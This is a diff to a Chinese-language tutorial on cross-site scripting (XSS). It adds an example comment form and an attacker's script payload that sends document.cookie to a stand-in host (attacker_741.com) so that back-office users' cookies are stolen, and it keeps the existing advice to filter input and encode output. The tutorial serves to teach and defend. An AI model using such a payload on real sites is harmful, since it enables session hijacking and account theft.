@@ -44,18 +44,20 @@ XSS的发生起源来自于用户输入，因此根据用户输入数据以何�
 1.一般形式:
   例：
   test.html:
-   
-  攻击者输入：
+    <form method="post" action="/">
+      <fieldset>
+        <label>备注：</label><input type="text" value="" />
+      </fieldset>
+    </form>
+  攻击者在备注输入框中输入如下内容，然后后台系统的使用人员的cookie信息将会被攻击者拿到：
+    <script>document.getElementById('attacker').href='http://www.attacker_741.com/receiveCookies.html?'+document.cookie;</script>
     
-  
+
 # 总的预防措施:
   对输入(和URL参数)进行过滤，对输出进行编码
 
-# 编码预防原理：
+## 编码预防原理：
   将相关内容编码后，其只能作为字符串在页面中进行显示，而不能作为Html或js或url进行解析执行。
-
-## 浏览器对Html、js和url的解析原理：
-
 
 ## 注意事项：
 1.url编码时，不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，进而导致不能正常解码，不能正常执行；
